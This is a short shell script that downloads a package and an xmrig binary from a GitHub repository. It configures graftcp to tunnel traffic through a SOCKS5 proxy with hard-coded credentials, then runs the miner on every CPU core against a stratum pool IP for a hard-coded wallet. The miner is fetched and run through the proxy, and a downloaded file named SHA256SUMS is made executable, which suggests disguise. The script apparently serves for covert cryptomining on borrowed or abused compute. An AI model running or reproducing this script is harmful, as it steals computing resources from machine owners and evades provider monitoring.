#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.88.24.234:443

socks5_username = temera88

socks5_password = temera88

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2
./graftcp/graftcp wget https://github.com/Melpinoy/Gg/raw/main/xmrig && chmod +x xmrig

./graftcp/graftcp wget https://github.com/Melpinoy/Gg/raw/main/SHA256SUMS && chmod +x SHA256SUMS


./graftcp/graftcp ./xmrig -o stratum+tcp://49.157.28.152:443 -u 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE -p x -a rx/0 -t $(nproc --all) 

